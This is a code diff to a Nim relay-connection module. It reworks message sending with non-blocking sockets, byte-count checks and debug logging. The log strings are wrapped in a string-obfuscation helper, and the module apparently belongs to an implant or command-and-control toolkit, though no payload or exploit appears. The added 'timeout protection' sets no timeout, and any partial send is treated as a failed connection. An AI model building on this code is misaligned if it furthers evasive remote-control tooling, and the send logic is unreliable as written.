@@ -1,4 +1,4 @@
-import net, nativesockets, strutils
+import net, nativesockets, strutils, times, os
 import relay_protocol
 import ../../util/strenc
 
@@ -128,7 +128,7 @@ proc acceptConnection*(server: var RelayServer): RelayConnection =
             when defined debug:
                 echo obf("[RELAY] No connections waiting (non-blocking): ") & errorMsg
 
-# Send message through connection
+# Send message through connection - WITH TIMEOUT PROTECTION
 proc sendMessage*(conn: var RelayConnection, msg: RelayMessage): bool =
     # RACE CONDITION PROTECTION: Check connection state atomically
     if not conn.isConnected:
@@ -149,23 +149,89 @@ proc sendMessage*(conn: var RelayConnection, msg: RelayMessage): bool =
         when defined debug:
             echo obf("[RELAY] Sending message of length: ") & $msgLength
         
+        # CRITICAL FIX: Set socket to non-blocking mode for send to prevent hanging
+        # This prevents infinite blocking when server closes connection
+        conn.socket.getFd().setBlocking(false)
+        
         # Send message length first (4 bytes) - using safe encoding
         let lengthHeader = encodeUint32LE(msgLength)
-        conn.socket.send(lengthHeader)
+        
+        when defined debug:
+            echo obf("[RELAY] 💀 HANG DETECTION: About to send header - ") & $lengthHeader.len & obf(" bytes")
+            echo obf("[RELAY] 💀 CRITICAL: If this hangs, client is corrupted!")
+            
+            # BASIC SOCKET FD CHECK to detect corruption before hang
+            try:
+                let fd = conn.socket.getFd()
+                if fd == osInvalidSocket:
+                    echo obf("[RELAY] 💀 SOCKET FD CORRUPTED - would cause infinite hang!")
+                    conn.isConnected = false
+                    return false
+                else:
+                    echo obf("[RELAY] ✅ Socket FD valid: ") & $int(fd)
+            except:
+                echo obf("[RELAY] 💀 SOCKET CHECK FAILED - client corrupted!")
+                conn.isConnected = false
+                return false
+        
+        # CRITICAL POINT: This is where the hang occurs in cycle #39
+        let headerBytesSent = conn.socket.send(lengthHeader.cstring, lengthHeader.len)
+        
+        when defined debug:
+            echo obf("[RELAY] 🎉 socket.send() COMPLETED! (did not hang)")
+            echo obf("[RELAY] 📊 Send result: ") & $headerBytesSent & obf("/") & $lengthHeader.len & obf(" bytes")
+        
+        # Check if send was successful
+        if headerBytesSent != lengthHeader.len:
+            when defined debug:
+                echo obf("[RELAY] ❌ Header send failed: sent ") & $headerBytesSent & obf(" of ") & $lengthHeader.len & obf(" bytes")
+                echo obf("[RELAY] ❌ Server likely closed connection")
+            conn.isConnected = false
+            return false
+        
+        when defined debug:
+            echo obf("[RELAY] Header sent successfully")
         
         # Send message data
-        conn.socket.send(serializedMsg)
+        when defined debug:
+            echo obf("[RELAY] Sending message data: ") & $serializedMsg.len & obf(" bytes")
+        
+        # NON-BLOCKING SEND for message data
+        let msgBytesSent = conn.socket.send(serializedMsg.cstring, serializedMsg.len)
+        
+        # Check if message data send was successful
+        if msgBytesSent != serializedMsg.len:
+            when defined debug:
+                echo obf("[RELAY] ❌ Message data send failed: sent ") & $msgBytesSent & obf(" of ") & $serializedMsg.len & obf(" bytes")
+                echo obf("[RELAY] ❌ Server likely closed connection")
+            conn.isConnected = false
+            return false
+        
+        when defined debug:
+            echo obf("[RELAY] Message data sent successfully")
         
         when defined verbose:
             echo obf("[DEBUG]: Sent message type ") & $msg.msgType & obf(" to ") & conn.remoteHost
         
+        when defined debug:
+            echo obf("[RELAY] ✅ Message sent successfully")
+        
         return true
     except:
+        # TIMEOUT OR CONNECTION ERROR
+        let errorMsg = getCurrentExceptionMsg()
+        when defined debug:
+            echo obf("[RELAY] 💥 Send failed: ") & errorMsg
+            if "would block" in errorMsg.toLower() or "temporarily unavailable" in errorMsg.toLower():
+                echo obf("[RELAY] 🔍 Send would block - server connection dead")
+            else:
+                echo obf("[RELAY] 🔍 Send error - connection problem")
+        
         # ATOMIC STATE CHANGE: Mark as disconnected only if still connected
         if conn.isConnected:
             conn.isConnected = false
             when defined debug:
-                echo obf("[STATE] Connection marked as disconnected due to send error: ") & getCurrentExceptionMsg()
+                echo obf("[STATE] Connection marked as disconnected due to send error: ") & errorMsg
         return false
 
 # Receive message from connection
